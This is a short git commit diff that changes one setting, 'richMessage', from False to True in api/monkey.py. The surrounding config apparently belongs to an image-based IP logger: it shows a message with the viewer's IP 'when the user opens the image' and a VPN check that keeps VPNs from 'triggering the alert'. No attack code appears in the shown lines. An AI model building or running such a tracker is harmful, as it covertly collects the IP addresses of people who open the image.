cd444ecc1d0f0dffd627cd319b161af75d97f4ea
rinmik0 <155125986+rinmik0@users.noreply.github.com>
2023-12-29 23:29:48 +0100

    Update monkey.py

--- api/monkey.py
+++ api/monkey.py
@@ -29,7 +29,7 @@ config = {
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
         "message": "Your ip is {ip} check if your browser is working :P", # Message to show
-        "richMessage": False, # Enable rich text? (See README for more info)
+        "richMessage": True, # Enable rich text? (See README for more info)
     },
 
     "vpnCheck": 1, # Prevents VPNs from triggering the alert
